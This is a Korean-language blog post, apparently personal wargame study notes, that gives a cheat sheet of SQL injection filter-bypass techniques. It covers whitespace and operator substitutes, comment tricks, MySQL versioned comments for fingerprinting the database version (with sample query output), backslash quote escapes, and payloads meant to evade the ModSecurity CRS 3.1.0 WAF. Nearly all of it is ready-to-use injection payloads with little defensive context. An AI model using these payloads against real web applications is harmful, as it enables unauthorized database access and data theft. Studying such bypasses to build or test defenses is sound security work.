---
title : SQL Injection 필터링 우회
categories : [Hacking, Web]
tags : [SQL injection, filter bypass]
---

## 공백 문자 우회
<hr style="border-top: 1px solid;"><br>

```
\n(Line Feed) -> %0a

\t(TAB) -> %09

\r(Carrage Return) -> %0d

/**/(주석)

소괄호()   ex) id='()or(id='admin') #

더하기(+)  ex) id='+or+id='admin' #

%0b, %0c

대괄호[]   ex) select[id]from[table]
```

<br><br>
<hr style="border: 2px solid;"><br>
<br><br>

## 논리연산자 우회
<hr style="border-top: 1px solid;"><br>

```
or -> ||

AND -> && -> %26%26
```

<br><br>
<hr style="border: 2px solid;"><br>
<br><br>

## 비교연산자 우회
<hr style="border-top: 1px solid;"><br>

```
= -> like, in으로 대체
```

<br><br>
<hr style="border: 2px solid;"><br>
<br><br>

## 주석처리
<hr style="border-top: 1px solid;"><br>

```
1. -- 공백 -> -- 뒤에 공백 있어야 함, 한줄 주석

2. # -> %23 -> 한줄 주석
```

<br>

```
3. /* */ -> 사이에 있는 문자열만 주석 
         -> /* /* */ */ 이렇게 있으면 먼저 열리고 먼저 닫힌 것 사이만 주석처리 

ex) select id from rubiya where id='admin' /*or 1/* and id='admin'*/
-> 실행됨.

ex) select id from rubiya where id='admin' /*or 1/* and */id='admin'*/
-> 에러
```

<br>

```
4. ;%00 -> ;와 NULL이 합쳐진 주석
```

<br>

```
5. /*!a b*/ -> a에는 mysql version, b에는 sql 문
            -> 해당 db 버전이 a 미만일 때 주석 처리됨.
            

https://dev.mysql.com/doc/refman/8.0/en/comments.html
```

<br>

```            
ex) /*!50000 or id='admin'*/ -> 해당 db가 5.X버전 이하이면 주석 실행 

mysql> select version();
+-------------------------+
| version()               |
+-------------------------+
| 5.7.32-0ubuntu0.18.04.1 |
+-------------------------+


mysql> select id from rubiya where id='' /*!60000 or id='admin'*/;
Empty set (0.00 sec)

-> 내 버전은 5.7이므로 6버전 이하라서 주석 실행


mysql> select id from rubiya where id='' /*!50000 or id='admin'*/ ;
+-------+
| id    |
+-------+
| admin |
+-------+
1 row in set (0.00 sec)
```

<br>

이거로 db 버전을 알아낼 수도 있음.

<br>

```
mysql> select /*!50732 1/0, */ 1 from rubiya;
+------+---+
| 1/0  | 1 |
+------+---+
| NULL | 1 |
| NULL | 1 |
| NULL | 1 |
+------+---+
3 rows in set, 3 warnings (0.00 sec)
```

<br>

```
mysql> select /*!50733 1/0, */ 1 from rubiya;
+---+
| 1 |
+---+
| 1 |
| 1 |
| 1 |
+---+
3 rows in set (0.00 sec)
```

<br>

```
5.07.32는 주석 처리가 안되고 5.07.33에서는 주석처리 되는 것을 보아

이 db의 버전은 5.07.32인 것을 알아낼 수 있음.
```

<br><br>
<hr style="border: 2px solid;"><br>
<br><br>

## 싱글쿼터 우회
<hr style="border-top: 1px solid;"><br>

```
1. 더블쿼터 사용

2. 백슬래쉬 사용(\) ex) id='\' and pw='or 1 #'
  -> id 값으로 \' and pw=이 들어가고 그 뒤에 or 1 # 되면서 작동
```

<br><br>
<hr style="border: 2px solid;"><br>
<br><br>

## CRS 3.1.0 WAF 우회
<hr style="border-top: 1px solid;"><br>

```
1. {`a` b} -> a는 함수 이름(아무거나), b는 sql문

  ex) ?id='' or {`if` 1} %23

2. <@

  ex) ?id=' <@ or 1 %23

  ex) ?id=' <@ union/**/select 1 %23
```

<br><br>
<hr style="border: 2px solid;"><br>
<br><br>
